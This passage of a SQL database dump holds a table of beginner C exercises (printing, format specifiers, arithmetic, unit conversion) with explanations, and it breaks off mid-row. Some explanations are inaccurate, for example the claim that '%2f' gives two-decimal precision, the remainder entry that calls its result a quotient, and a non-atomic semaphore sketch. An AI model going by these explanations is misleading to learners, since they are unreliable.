style=\"font-size:12.0pt;line-height:115%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">&nbsp;Private int Machine_free;<o:p></o:p></span></p><p class=\"MsoNormal\" style=\"text-align:justify;text-justify:inter-ideograph\"><span style=\"font-size:12.0pt;line-height:115%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">&nbsp;Public void machine_synchornize()<o:p></o:p></span></p><p class=\"MsoNormal\" style=\"text-align:justify;text-justify:inter-ideograph\"><span style=\"font-size:12.0pt;line-height:115%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">&nbsp;{<o:p></o:p></span></p><p class=\"MsoNormal\" style=\"text-align:justify;text-justify:inter-ideograph\"><span style=\"font-size:12.0pt;line-height:115%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">&nbsp; Machine_free = 1;<o:p></o:p></span></p><p class=\"MsoNormal\" style=\"text-align:justify;text-justify:inter-ideograph\"><span style=\"font-size:12.0pt;line-height:115%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">&nbsp; }</span></p><p class=\"MsoNormal\" style=\"text-align:justify;text-justify:inter-ideograph\">&nbsp; &nbsp;Public void wait()</p><p class=\"MsoNormal\">&nbsp; {</p><p class=\"MsoNormal\">&nbsp; &nbsp;While(this.machine_free\r\n&lt;=0);</p><p class=\"MsoNormal\">&nbsp; &nbsp; Machine_free--;</p><p class=\"MsoNormal\">&nbsp; &nbsp;}</p><p class=\"MsoNormal\"><o:p>&nbsp; &nbsp;</o:p>Public void Signal()</p><p class=\"MsoNormal\">&nbsp; &nbsp;{</p><p class=\"MsoNormal\">&nbsp; &nbsp; Machine_free++;</p><p class=\"MsoNormal\">&nbsp; &nbsp; }</p><p class=\"MsoNormal\"><o:p>&nbsp; &nbsp;&nbsp;</o:p>Class user</p><p class=\"MsoNormal\">&nbsp; &nbsp; {</p><p class=\"MsoNormal\"><span style=\"text-indent: 0.5in;\">&nbsp; &nbsp; Void Dowork()</span></p><p class=\"MsoNormal\"><span style=\"text-indent: 0.5in;\">&nbsp; &nbsp; {</span></p><p class=\"MsoNormal\"><span style=\"text-indent: 0.5in;\">&nbsp; &nbsp; Machine_synchornize\r\nM1 = new machine_synchornize();</span></p><p class=\"MsoNormal\"><span style=\"text-indent: 0.5in;\">&nbsp; &nbsp; M1.wait();</span></p><p class=\"MsoNormal\"><span style=\"text-indent: 0.5in;\">&nbsp; &nbsp; //Access\r\nMachine;</span></p><p class=\"MsoNormal\"><span style=\"text-indent: 0.5in;\">&nbsp; &nbsp; M1.signal();</span></p><p class=\"MsoNormal\"><span style=\"text-indent: 0.5in;\">&nbsp; &nbsp; }</span></p><p class=\"MsoListParagraphCxSpLast\" style=\"text-align:justify;text-justify:inter-ideograph;\r\ntext-indent:-.25in;mso-list:l0 level1 lfo1\"><span style=\"font-size:12.0pt;line-height:115%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\">\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n</span></p><p class=\"MsoNormal\">&nbsp; &nbsp; }</p><p class=\"MsoListParagraphCxSpLast\" style=\"text-align:justify;text-justify:inter-ideograph;\r\ntext-indent:-.25in;mso-list:l0 level1 lfo1\"><span style=\"font-size:12.0pt;line-height:115%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;\"><o:p><br></o:p></span></p>','2022-07-28 12:38:27.000000',6,'logo_ac773e45b008d6616aadbc1a30507760_1x_JHxBRDT.png');
/*!40000 ALTER TABLE `example_app_post` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `example_app_program`
--

DROP TABLE IF EXISTS `example_app_program`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `example_app_program` (
  `id` int NOT NULL AUTO_INCREMENT,
  `program_title` varchar(250) CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci NOT NULL,
  `slug` varchar(255) CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci DEFAULT NULL,
  `program_description` longtext CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci NOT NULL,
  `complexity` varchar(1) CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci NOT NULL,
  `solution` longtext CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci,
  `solution_path` varchar(1000) CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci DEFAULT NULL,
  `explanation` longtext CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci,
  `chapter_id` int NOT NULL,
  `output_file` varchar(100) CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci DEFAULT NULL,
  `raptor_file` varchar(100) CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci DEFAULT NULL,
  `featured_image` varchar(100) CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `slug` (`slug`),
  KEY `example_app_program_chapter_id_6e2b9b8b` (`chapter_id`)
) ENGINE=MyISAM AUTO_INCREMENT=1139 DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `example_app_program`
--

LOCK TABLES `example_app_program` WRITE;
/*!40000 ALTER TABLE `example_app_program` DISABLE KEYS */;
INSERT INTO `example_app_program` VALUES (59,'C Program to Print Welcome','C-Program-to-Print-Welcome','<p style=\"line-height: 1;\">Program should simply display \"Welcome\".\r\n</p><p style=\"line-height: 1;\">Sample Output:\r\n</p><p style=\"line-height: 1;\">Welcome</p>','B','','prog/c/welcome.c','<p style=\"line-height: 1;\">printf is a function available(pre defined) in C library which is used to print the specified\r\ncontent in Monitor.</p><p style=\"line-height: 1;\"> \r\n\r\nHere it prints the String literal \"Welcome\".</p>',1,NULL,NULL,NULL),(60,'C Program to Print the given Message','C-Program-to-Print-the-given-Message','<p style=\"line-height: 1;\">Get a Message from user and display the same.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">hello\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">hello\r\n</p><p style=\"line-height: 1;\">Sample Input 2:\r\n</p><p style=\"line-height: 1;\">hi boss\r\n</p><p style=\"line-height: 1;\">Sample Output 2:\r\n</p><p style=\"line-height: 1;\">hi boss</p>','B','','prog/c/printline.c','<p style=\"line-height: 1;\">scanf is a function available(predefined) in c library to get input from user via keyboard and stores the same in a variable. </p><p style=\"line-height: 1;\">Here it reads input string and stores it in a variable str1. </p><p style=\"line-height: 1;\">Format Specifier \"%[^\\\\t]s\" reads input as string and terminates read operation while entering tab space or enter button. </p><p style=\"line-height: 1;\">printf is a function available(pre defined) in C library which is used to print the specified content in Monitor. </p><p style=\"line-height: 1;\">Here it prints the value of the variable str1.</p><p style=\"line-height: 1;\"> Format Specifier \"%s\" prints value as String.</p>',1,NULL,NULL,NULL),(61,'C Program to Print the given word','C-Program-to-Print-the-given-word','<p style=\"line-height: 1;\">Get a Word from user and display the same.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">hello\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">hello\r\n</p><p style=\"line-height: 1;\">Sample Input 2:\r\n</p><p style=\"line-height: 1;\">hi boss\r\n</p><p style=\"line-height: 1;\">Sample Output 2:\r\n</p><p style=\"line-height: 1;\">hi</p>','B','','prog/c/printword.c','<p style=\"line-height: 1;\">scanf is a function available(predefined) in c library to get input from user via keyboard and stores the same in a variable. </p><p style=\"line-height: 1;\">Here it reads input string and stores it in a variable str1.\r\n</p><p style=\"line-height: 1;\">\r\nFormat Specifier \"%s\"  reads input as string and terminates read operation while entering space or enter button.</p><p style=\"line-height: 1;\">\r\n\r\nprintf is a function available(pre defined) in C library which is used to print the specified content in Monitor.</p><p style=\"line-height: 1;\"> Here it prints the value of the variable str1.\r\n</p><p style=\"line-height: 1;\">\r\nFormat Specifier \"%s\" prints value as String.</p>',1,NULL,NULL,NULL),(62,'C Program to print the given integer number','C-Program-to-print-the-given-integer-number','<p style=\"line-height: 1;\">Get a number from user and display the same\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">56\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">56</p>','B','','prog/c/printint.c','<p style=\"line-height: 1;\">scanf is a function available(predefined) in c library to get input from user via keyboard and stores the same in a variable. </p><p style=\"line-height: 1;\">Here it reads input number and stores it in a variable num.\r\n</p><p style=\"line-height: 1;\">\r\nFormat Specifier \"%d\" reads input as integer number. </p><p style=\"line-height: 1;\">(d for decimal number system)\r\n\r\nprintf is a function available(pre defined) in C library which is used to print the specified content in Monitor. </p><p style=\"line-height: 1;\">Here it prints the value of the variable num.\r\n</p><p style=\"line-height: 1;\">\r\nFormat Specifier \"%d\" prints value as Integer.</p>',1,NULL,NULL,NULL),(63,'C Program to print the given  fractional number','C-Program-to-print-the-given-fractional-number','<p style=\"line-height: 1;\">Get a fractional number from user and display the same\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n56.3426\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">56.3426</p>','B','','prog/c/printfloat.c','<p style=\"line-height: 1;\">scanf is a function available(predefined) in c library to get input from user via keyboard and stores the same in a variable. </p><p style=\"line-height: 1;\">Here it reads input number and stores it in a variable num.\r\n</p><p style=\"line-height: 1;\">\r\nFormat Specifier \"%f\" reads input as floating number.</p><p style=\"line-height: 1;\"> (fractional number)\r\n\r\nprintf is a function available(pre defined) in C library which is used to print the specified content in Monitor. </p><p style=\"line-height: 1;\">Here it prints the value of the variable num.\r\n</p><p style=\"line-height: 1;\">\r\nFormat Specifier \"%f\" prints value as Floating Point Number.\r\n</p>',1,NULL,NULL,NULL),(64,'C Program to print the given fractional number in 2 digit decimal format','C-Program-to-print-the-given-fractional-number-in-2-digit-decimal-format','<p style=\"line-height: 1;\">Get a fractional number from user and display the same in two digit precision\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">56.3426\r\n</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\n56.34</p>','B','','prog/c/printprecision.c','<p style=\"line-height: 1;\">scanf is a function available(predefined) in c library to get input from user via keyboard and stores the same in a variable. </p><p style=\"line-height: 1;\">Here it reads input number and stores it in a variable num.\r\n</p><p style=\"line-height: 1;\">\r\nFormat Specifier \"%f\" reads input as floating number. </p><p style=\"line-height: 1;\">(fractional number)\r\n\r\nprintf is a function available(pre defined) in C library which is used to print the specified content in Monitor.</p><p style=\"line-height: 1;\"> Here it prints the value of the variable num.\r\n</p><p style=\"line-height: 1;\">\r\nFormat Specifier \"%2f\" prints value as Floating Point Number with 2digit Precision(.00).\r\n</p>',1,NULL,NULL,NULL),(65,'C Program to print given integer number in Hexadecimal format','C-Program-to-print-given-integer-number-in-Hexadecimal-format','<p style=\"line-height: 1;\">Get a number from user and display the corresponding hexadecimal value\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">11\r\n</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\nB\r\n</p><p style=\"line-height: 1;\">Sample Input 2:</p><p style=\"line-height: 1;\">\r\n20\r\n</p><p style=\"line-height: 1;\">Sample Output 2:\r\n</p><p style=\"line-height: 1;\">14</p>','B','','prog/c/printhex.c','<p style=\"line-height: 1;\">scanf is a function available(predefined) in c library to get input from user via keyboard and stores the same in a variable. </p><p style=\"line-height: 1;\">Here it reads input number and stores it in a variable num.</p><p style=\"line-height: 1;\">\r\nFormat Specifier \"%d\" reads input as integer number. (d for decimal number system)\r\n\r\nprintf is a function available(pre defined) in C library which is used to print the specified content in Monitor. </p><p style=\"line-height: 1;\">Here it prints the value of the variable num.\r\n</p><p style=\"line-height: 1;\">\r\nFormat Specifier \"%x\" prints value as Hexa decimal number.</p>',1,NULL,NULL,NULL),(66,'C Program to print given integer number in octal format','C-Program-to-print-given-integer-number-in-octal-format','<p style=\"line-height: 1;\">Get a number from user and display the corresponding Octal value</p><p style=\"line-height: 1;\">\r\nSample Input 1:\r\n</p><p style=\"line-height: 1;\">11\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">13\r\n</p><p style=\"line-height: 1;\">Sample Input 2:\r\n</p><p style=\"line-height: 1;\">20\r\n</p><p style=\"line-height: 1;\">Sample Output 2:</p><p style=\"line-height: 1;\">\r\n24</p>','B','','prog/c/printoct.c','<p style=\"line-height: 1;\">scanf is a function available(predefined) in c library to get input from user via keyboard and stores the same in a variable. </p><p style=\"line-height: 1;\">Here it reads input number and stores it in a variable num.</p><p style=\"line-height: 1;\">\r\n\r\nFormat Specifier \"%d\" reads input as integer number. (d for decimal number system)\r\n\r\nprintf is a function available(pre defined) in C library which is used to print the specified content in Monitor. </p><p style=\"line-height: 1;\">Here it prints the value of the variable num.</p><p style=\"line-height: 1;\">\r\n\r\nFormat Specifier \"%o\" prints value as Octal number.</p>',1,NULL,NULL,NULL),(67,'C Program to print given hexadecimal number in integer format','C-Program-to-print-given-hexadecimal-number-in-integer-format','<p style=\"line-height: 1;\">Get a hexadecimal number from user and display the corresponding integer value</p><p style=\"line-height: 1;\">\r\nSample Input 1:\r\n</p><p style=\"line-height: 1;\">14\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">20\r\n</p><p style=\"line-height: 1;\">Sample Input 2:\r\n</p><p style=\"line-height: 1;\">A\r\n</p><p style=\"line-height: 1;\">Sample Output 2:\r\n</p><p style=\"line-height: 1;\">10</p>','B','','prog/c/printhexasint.c','<p style=\"line-height: 1;\">scanf is a function available(predefined) in c library to get input from user via keyboard and stores the same in a variable. </p><p style=\"line-height: 1;\">Here it reads input number and stores it in a variable num.\r\n</p><p style=\"line-height: 1;\">\r\nFormat Specifier \"%x\" reads input as Hexa decimal number. </p><p style=\"line-height: 1;\">\r\n\r\nprintf is a function available(pre defined) in C library which is used to print the specified content in Monitor. </p><p style=\"line-height: 1;\">Here it prints the value of the variable num.\r\n</p><p style=\"line-height: 1;\">\r\nFormat Specifier \"%d\" prints value as Integer number (d for decimal number system).</p>',1,NULL,NULL,NULL),(68,'C Program to print given octal number in integer format','C-Program-to-print-given-octal-number-in-integer-format','<p style=\"line-height: 1;\">Get a Octal number from user and display the corresponding integer value\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">24\r\n</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\n20\r\n</p><p style=\"line-height: 1;\">Sample Input 2:\r\n</p><p style=\"line-height: 1;\">10\r\n</p><p style=\"line-height: 1;\">Sample Output 2:</p><p style=\"line-height: 1;\">\r\n8</p>','B','','prog/c/printoctasint.c','<p style=\"line-height: 1;\">scanf is a function available(predefined) in c library to get input from user via keyboard and stores the same in a variable. </p><p style=\"line-height: 1;\">Here it reads input number and stores it in a variable num.</p><p style=\"line-height: 1;\">\r\n\r\nFormat Specifier \"%o\" reads input as Octal number. </p><p style=\"line-height: 1;\">\r\n\r\nprintf is a function available(pre defined) in C library which is used to print the specified content in Monitor. </p><p style=\"line-height: 1;\">Here it prints the value of the variable num.\r\n</p><p style=\"line-height: 1;\">\r\nFormat Specifier \"%d\" prints value as Integer number (d for decimal number system).</p>',1,NULL,NULL,NULL),(69,'C Program to print the ASCII value of a character','C-Program-to-print-the-ASCII-value-of-a-character','<p style=\"line-height: 1;\">Get a character from user and display the corresponding ASCII value\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">A\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">65\r\n</p><p style=\"line-height: 1;\">Sample Input 2:</p><p style=\"line-height: 1;\">\r\nJ\r\n</p><p style=\"line-height: 1;\">Sample Output 2:</p><p style=\"line-height: 1;\">\r\n74</p>','B','','prog/c/printascii.c','<p style=\"line-height: 1;\">scanf is a function available(predefined) in c library to get input from user via keyboard and stores the same in a variable. </p><p style=\"line-height: 1;\">Here it reads input character and stores it in a variable ch.\r\n</p><p style=\"line-height: 1;\">\r\nFormat Specifier \"%c\" reads single character.\r\n</p><p style=\"line-height: 1;\">\r\nprintf is a function available(pre defined) in C library which is used to print the specified content in Monitor. </p><p style=\"line-height: 1;\">Here it prints the value of the variable ch.\r\n</p><p style=\"line-height: 1;\">\r\nFormat Specifier \"%d\" prints value as Integer number (character converted to ASCII).</p>',1,NULL,NULL,NULL),(70,'C Program to print the character for given ASCII value','C-Program-to-print-the-character-for-given-ASCII-value','<p style=\"line-height: 1;\">Get a ASCII value from user  (0 to 255) and display the corresponding character\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">75</p><p style=\"line-height: 1;\">\r\nSample Output 1:\r\n</p><p style=\"line-height: 1;\">K\r\n</p><p style=\"line-height: 1;\">Sample Input 2:\r\n</p><p style=\"line-height: 1;\">97</p><p style=\"line-height: 1;\">\r\nSample Output 2:\r\n</p><p style=\"line-height: 1;\">a\r\n</p>','B','','prog/c/printchar.c','<p style=\"line-height: 1;\">scanf is a function available(predefined) in c library to get input from user via keyboard and stores the same in a variable. </p><p style=\"line-height: 1;\">Here it reads input number and stores it in a variable num.</p><p style=\"line-height: 1;\"> Format Specifier \"%d\" reads Input as integer number.</p><p style=\"line-height: 1;\"> printf is a function available(pre defined) in C library which is used to print the specified content in Monitor.</p><p style=\"line-height: 1;\"> Here it prints the value of the variable num.</p><p style=\"line-height: 1;\"> Format Specifier \"%c\" prints value as character (ASCII Converted to Character).</p>',1,NULL,NULL,NULL),(71,'C Program to print two numbers with a space between them','C-Program-to-print-two-numbers-with-a-space-between-them','<p style=\"line-height: 1;\">Get two integer numbers, dispaly them with single space\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">5 6</p><p style=\"line-height: 1;\">\r\nSample Output 1:\r\n</p><p style=\"line-height: 1;\">5 6\r\n</p><p style=\"line-height: 1;\">Sample Input 2:</p><p style=\"line-height: 1;\">\r\n65 4\r\n</p><p style=\"line-height: 1;\">Sample  Output 2:\r\n</p><p style=\"line-height: 1;\">65 4\r\n</p>','B','','prog/c/printnumspace.c','<p style=\"line-height: 1;\">scanf is a function available(predefined) in c library to get input from user via keyboard and stores the same in a variable. </p><p style=\"line-height: 1;\">Here it reads two input numbers and stores it in a variable num1 and num2.</p><p style=\"line-height: 1;\">\r\n\r\nFormat Specifier \"%d %d\" reads two integers.</p><p style=\"line-height: 1;\">\r\n\r\nprintf is a function available(pre defined) in C library which is used to print the specified content in Monitor. </p><p style=\"line-height: 1;\">Here it prints the value of the variable num1 and num2.\r\n</p><p style=\"line-height: 1;\">\r\nFormat Specifier  \"%d %d\" prints value of num1 and num2 with space.</p>',1,NULL,NULL,NULL),(72,'C Program to print two numbers with a tab space between them','C-Program-to-print-two-numbers-with-a-tab-space-between-them','<p style=\"line-height: 1;\">Get two integer numbers, dispaly them with tab space\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">5 6\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">5                      6\r\n</p><p style=\"line-height: 1;\">Sample Input 2:</p><p style=\"line-height: 1;\">\r\n65 4\r\n</p><p style=\"line-height: 1;\">Sample  Output 2:\r\n</p><p style=\"line-height: 1;\">65                    4\r\n</p>','B','','prog/c/printnumtab.c','<p style=\"line-height: 1;\">scanf is a function available(predefined) in c library to get input from user via keyboard and stores the same in a variable. </p><p style=\"line-height: 1;\">Here it reads two input numbers and stores it in a variable num1 and num2.</p><p style=\"line-height: 1;\">&nbsp;Format Specifier \"%d %d\" reads two integers.</p><p style=\"line-height: 1;\">printf is a function available(pre defined) in C library which is used to print the specified content in Monitor.</p><p style=\"line-height: 1;\"> Here it prints the value of the variable num1 and num2.</p><p style=\"line-height: 1;\"> Format Specifier  \"%d\\\\t%d\" prints value of num1 and num2 with tab space.</p>',1,NULL,NULL,NULL),(73,'C Program to print two numbers in two lines','C-Program-to-print-two-numbers-in-two-lines','<p style=\"line-height: 1;\">Get two integer numbers, dispaly them in two lines\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">5 6</p><p style=\"line-height: 1;\">\r\nSample Output 1:\r\n</p><p style=\"line-height: 1;\">5</p><p style=\"line-height: 1;\">6\r\n</p><p style=\"line-height: 1;\">Sample Input 2:\r\n</p><p style=\"line-height: 1;\">65 4</p><p style=\"line-height: 1;\">Sample Output 2:\r\n</p><p style=\"line-height: 1;\">65</p><p style=\"line-height: 1;\">\r\n4</p>','B','','prog/c/printnumline.c','<p style=\"line-height: 1;\">scanf is a function available(predefined) in c library to get input from user via keyboard and stores the same in a variable. </p><p style=\"line-height: 1;\">Here it reads two input numbers and stores it in a variable num1 and num2.</p><p style=\"line-height: 1;\">Format Specifier \"%d %d\" reads two integers.</p><p style=\"line-height: 1;\"> printf is a function available(pre defined) in C library which is used to print the specified content in Monitor.</p><p style=\"line-height: 1;\">Here it prints the value of the variable num1 and num2.</p><p style=\"line-height: 1;\">Format Specifier  \"%d\\\\n%d\" prints value of num1 and num2 in two lines.</p>',1,NULL,NULL,NULL),(74,'C Program to Addition of two numbers','C-Program-to-Addition-of-two-numbers','<p style=\"line-height: 1;\">Get two integer numbers, add both the integers and display the sum.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n5 6</p><p style=\"line-height: 1;\"> Sample Output 1:</p><p style=\"line-height: 1;\">11\r\n</p><p style=\"line-height: 1;\">Sample Input 2:\r\n</p><p style=\"line-height: 1;\">65 4\r\n</p><p style=\"line-height: 1;\">Sample Output 2:\r\n</p><p style=\"line-height: 1;\">69\r\n</p>','B','','prog/c/add.c','Get two integers a and b (using scanf statement)\r\nAdd a and b, then store the sum in c (c=a+b)\r\nprint the value of c (using printf statement)',2,'','raptor/addition_D8mHKNO.PNG',''),(75,'C Program to subtraction of two numbers','C-Program-to-subtraction-of-two-numbers','<p style=\"line-height: 1;\">Get two integer numbers, subtract both the integers and display the difference\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n6 5</p><p style=\"line-height: 1;\"> Sample Output 1:\r\n</p><p style=\"line-height: 1;\">1</p><p style=\"line-height: 1;\">Sample Input 2:\r\n</p><p style=\"line-height: 1;\">65 4\r\n</p><p style=\"line-height: 1;\">Sample Output 2:</p><p style=\"line-height: 1;\">\r\n61</p>','B','','prog/c/sub.c','Get two integers a and b (using scanf statement)\r\nSubract b from a, then store the difference in c (c=a-b)\r\nprint the value of c (using printf statement)',2,'','raptor/difference.PNG',''),(76,'C Program to multiply two numbers','C-Program-to-multiply-two-numbers','<p style=\"line-height: 1;\">Get two integer numbers, multiply both the integers and dispaly the product.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">5 6&nbsp;</p><p style=\"line-height: 1;\"> Sample Output 1:\r\n</p><p style=\"line-height: 1;\">30\r\n</p><p style=\"line-height: 1;\">Sample Input 2:&nbsp; </p><p style=\"line-height: 1;\">65 10\r\n</p><p style=\"line-height: 1;\">Sample Output 2:\r\n</p><p style=\"line-height: 1;\">650\r\n</p>','B','','prog/c/mul.c','Get two integers a and b (using scanf statement)\r\nmultiply a and b, then store the product in c (c=a*b)\r\nprint the value of c (using printf statement)',2,NULL,NULL,NULL),(77,'C Program to divide two numbers','C-Program-to-divide-two-numbers','<p style=\"line-height: 1;\">Get two integer numbers, divide both the integers and display the quotient.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">6 5&nbsp;</p><p style=\"line-height: 1;\"> Sample Output 1:\r\n</p><p style=\"line-height: 1;\">1\r\n</p><p style=\"line-height: 1;\">Sample Input 2:\r\n</p><p style=\"line-height: 1;\">28 4</p><p style=\"line-height: 1;\">Sample Output 2:\r\n</p><p style=\"line-height: 1;\">7\r\n</p>','B','','prog/c/div.c','Get two integers a and b (using scanf statement)\r\ndivide a by b, then store quotient in c (c=a/b, Note \"/\" operator gives quotient)\r\nprint the value of c (using printf statement)',2,'','raptor/divide_two_numbers_gguy9cg.PNG',''),(78,'C Program to find modulus of two numbers','C-Program-to-find-modulus-of-two-numbers','<p style=\"line-height: 1;\">Get two integer numbers, divide both the integers and display the remainder.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">6 5</p><p style=\"line-height: 1;\"> Sample Output 1:\r\n</p><p style=\"line-height: 1;\">1\r\n</p><p style=\"line-height: 1;\">Sample Input 2:\r\n</p><p style=\"line-height: 1;\">28 4\r\n</p><p style=\"line-height: 1;\">Sample Output 2:\r\n</p><p style=\"line-height: 1;\">0</p>','B','','prog/c/rem.c','Get two integers a and b (using scanf statement)\r\ndivide a by b, then store quotient in c (c=a%b, Note \"%\" operator gives remainder)\r\nprint the value of c (using printf statement)',2,NULL,NULL,NULL),(79,'C Program to convert Kilo Meters to Meters','C-Program-to-convert-Kilo-Meters-to-Meters','<p style=\"line-height: 1;\">Get Kilometer km from user and find meter m\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">56\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">56000\r\n\r\n</p>','B','','prog/c/kmtom.c','<p style=\"line-height: 1;\">Get kilometer km as input (using scanf statement)  (since kilometer may be in fractional values like 1.2 and 5.2, it is declared &amp; read as float.) </p><p style=\"line-height: 1;\">\r\n\r\nCalculate meter m by multipllying kilometer km with 1000. </p><p style=\"line-height: 1;\">(m=km*1000, 1000 meter is equal to 1 kilometer)\r\n\r\nprint meter m.</p><p style=\"line-height: 1;\"> (using printf statement)</p>',2,'','raptor/kilometer_to_meter_ZkOWT7P.PNG',''),(80,'C Program to convert Meters to Kilo Meters','C-Program-to-convert-Meters-to-Kilo-Meters','<p style=\"line-height: 1;\">Get meter m from user and find kilometer km\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">56000</p><p style=\"line-height: 1;\">\r\nSample Output 1:\r\n</p><p style=\"line-height: 1;\">56\r\n\r\n</p>','B','','prog/c/mtokm.c','<p style=\"line-height: 1;\">Get meter m as input  (using scanf statement)\r\n</p><p style=\"line-height: 1;\">\r\nCalculate kilometer km by dividing meter  m by 1000.</p><p style=\"line-height: 1;\"> (km=m/1000, 1000 meter is equal to 1 kilometer)\r\n\r\nprint kilometer km. </p><p style=\"line-height: 1;\">(using printf statement) (since kilometer may be in fractional values like 1.2 and 5.2, it is declared &amp; print as float.)</p>',2,NULL,NULL,NULL),(81,'C Program to find area of Square','C-Program-to-find-area-of-Square','<p style=\"line-height: 1;\">Get side of square and find area of square\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n4</p><p style=\"line-height: 1;\">\r\nSample Output 1:\r\n</p><p style=\"line-height: 1;\">16\r\n\r\n</p>','B','','prog/c/square.c','<p style=\"line-height: 1;\">Get side of a square (using scanf statement)\r\n</p><p style=\"line-height: 1;\">\r\nCalculate area by multiplying side and side(area = side * side)\r\n\r\nprint area(using printf statement)</p>',2,NULL,NULL,NULL),(82,'C Program to find area of Rectangle','C-Program-to-find-area-of-Rectangle','<p style=\"line-height: 1;\">Get length and breadth of rectangle and find area of rectangle\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">4 5\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">20\r\n\r\n</p>','B','','prog/c/rect.c','<p style=\"line-height: 1;\">Get length and breadth of a rectangle (using scanf statement)\r\n</p><p style=\"line-height: 1;\">\r\nCalculate area by multiplying length and breadth (area = length * breadth)\r\n\r\nprint area (using printf statement)</p>',2,NULL,NULL,NULL),(83,'C Program to find area of Right angled triangle','C-Program-to-find-area-of-Right-angled-triangle','<p style=\"line-height: 1;\">Get length and width of right angled trianlgle and find area of right angled triangle\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">4 5\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">10\r\n\r\n</p>','B','','prog/c/righttri.c','<p style=\"line-height: 1;\">Get length and width of a right angled triangle (using scanf statement)\r\n</p><p style=\"line-height: 1;\">\r\nCalculate area by dividing product of length and width by 2  (area = length * width/2)\r\n\r\nprint area (using printf statement)</p>',2,'','raptor/area_of_right_angle_triangle_EyFkdHn.PNG',''),(84,'C Program to find area of triangle','C-Program-to-find-area-of-triangle','<p style=\"line-height: 1;\">Get base width and height of triangle and find area of triangle\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">4 5\r\n</p><p style=\"line-height: 